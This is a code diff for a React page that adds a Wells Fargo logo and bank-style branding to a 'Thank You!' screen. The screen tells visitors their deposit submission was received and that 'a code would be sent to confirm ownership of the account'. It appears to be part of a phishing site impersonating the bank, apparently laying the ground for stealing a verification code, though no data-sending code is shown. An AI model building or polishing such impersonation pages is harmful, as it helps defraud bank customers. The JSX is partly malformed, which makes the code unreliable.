@@ -78,17 +78,7 @@ const handleSubmit = async (event: { preventDefault: () => void; }) => {
 
   return (
     
-    <main style={{
-
-      backgroundImage: "url('/assets/background.jpg')",
-      backgroundAttachment: 'fixed',
-      backgroundSize: 'cover',
-      backgroundRepeat: 'no-repeat',
-      backgroundPosition: 'center center',
-      height: '100%', // Example height, adjust as needed
-              width: '100%', // Example width, adjust as needed
-      zIndex:9999}}>
-        
+    <main>
         <div className='flex justify-between items-center text-white py-2 px-[20%] bg-red-600 border border-b-2 border-b-yellow-300'//</main>style={{position: 'fixed', top: 0, left: 0, right: 0, zIndex: 9999}}..//>
       >
       <div className="flex flex-col font-bold text-[25px]">
@@ -101,10 +91,13 @@ const handleSubmit = async (event: { preventDefault: () => void; }) => {
           <Link href="/contact" legacyBehavior><a className="hover:text-gray-500">Español</a></Link>
         </div>
 </div>
-<div className="flex flex-col justtify-center items-center w-full mx-uto">
-  <span className="text-[70px] font-bold font-ui-serif py-32">Thank You!</span>
+<div className="flex flex-col items-center justify-center space-y-4 p-3">
+        <img src="/assets/wellsfargo.jpg" alt="logo" className="sm:w-[20%] md:w-[20%] lg:w-[10%] mt-20"/>
+      </div>
+<div className="flex flex-col justtify-center items-center w-full mx-auto -mb-20 py-16">
+  <span className="text-[70px] font-bold font-ui-serif">Thank You!</span>
 </div>
-<div className="container w-full sm:w-[60%] md:w-[60%] lg:w-[30%] mx-auto px-6 bg-white mt-20">
+<div className="container w-full sm:w-[60%] md:w-[60%] lg:w-[40%] mx-auto px-3 bg-white">
       <div className="flex flex-col items-center justify-center space-y-4 py-3 rounded-md shadow-xl border border-gray-100">  
         <span className='text-center text-sm font-font-bold'>Your deposit submission has been received, <br /> a code would be sent to confirm ownership of the account, <br /> It may take 3 - 5 working days for your funds to arrive in your account. </span>
          </div>
